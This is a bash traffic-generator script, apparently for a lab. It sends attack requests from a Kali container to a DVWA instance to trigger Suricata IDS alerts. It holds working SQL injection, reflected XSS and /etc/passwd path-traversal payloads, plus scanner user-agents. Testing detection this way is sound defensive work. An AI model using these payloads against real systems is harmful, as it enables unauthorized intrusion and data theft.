#!/bin/bash
# attack_traffic.sh
# Simulates malicious traffic to trigger Suricata Alerts

KALI_CONTAINER="kali-attacker"
DVWA_URL="http://172.30.20.10"

DOCKER_BIN="docker"
if ! $DOCKER_BIN ps >/dev/null 2>&1; then
    DOCKER_BIN="sudo docker"
fi

echo "Ensuring curl exists inside $KALI_CONTAINER..."
$DOCKER_BIN exec -i "$KALI_CONTAINER" bash -lc 'apt-get update -qq >/dev/null 2>&1 || true; command -v curl >/dev/null 2>&1 || (apt-get install -y -qq curl >/dev/null 2>&1)'

echo "Starting ATTACK Traffic Generator..."
echo "Press [CTRL+C] to stop."

while true; do
    echo "------------------------------------------------"

    # 1. SQL Injection Simulation
    echo "[ATTACK] Sending SQL Injection..."
    # Description: Tries to bypass login using standard SQLi payload
    $DOCKER_BIN exec -i "$KALI_CONTAINER" bash -lc \
        "curl -s -o /dev/null \"$DVWA_URL/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit\" -H \"Cookie: security=low; PHPSESSID=test\" || true"

    sleep 1

    # 2. XSS Simulation
    echo "[ATTACK] Sending XSS Payload..."
    $DOCKER_BIN exec -i "$KALI_CONTAINER" bash -lc \
        "curl -s -o /dev/null \"$DVWA_URL/vulnerabilities/xss_r/?name=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E\" -H \"Cookie: security=low; PHPSESSID=test\" || true"

    sleep 1

    # 3. Directory Traversal / LFI
    echo "[ATTACK] Attempting /etc/passwd Access..."
    $DOCKER_BIN exec -i "$KALI_CONTAINER" bash -lc \
        "curl -s -o /dev/null \"$DVWA_URL/vulnerabilities/fi/?page=../../../../etc/passwd\" -H \"Cookie: security=low; PHPSESSID=test\" || true"

    sleep 1

    # 4. Suspicious User-Agent (Scanner Detection)
    echo "[ATTACK] Scanning with Malicious User-Agent..."
    $DOCKER_BIN exec -i "$KALI_CONTAINER" bash -lc \
        "curl -s -o /dev/null -A 'BlackSun' \"$DVWA_URL/\" || true"
    $DOCKER_BIN exec -i "$KALI_CONTAINER" bash -lc \
        "curl -s -o /dev/null -A 'Nikto' \"$DVWA_URL/\" || true"

    sleep 1

    # 5. Malware Test (TestMyNIDS - High Confidence)
    echo "[ATTACK] Simulating Malware Response (uid=0)..."
    $DOCKER_BIN exec -i "$KALI_CONTAINER" bash -lc \
        "curl -s -o /dev/null 'http://testmynids.org/uid/index.html' || true"

    echo " >> Cycle complete. Waiting 5s..."
    sleep 5
done
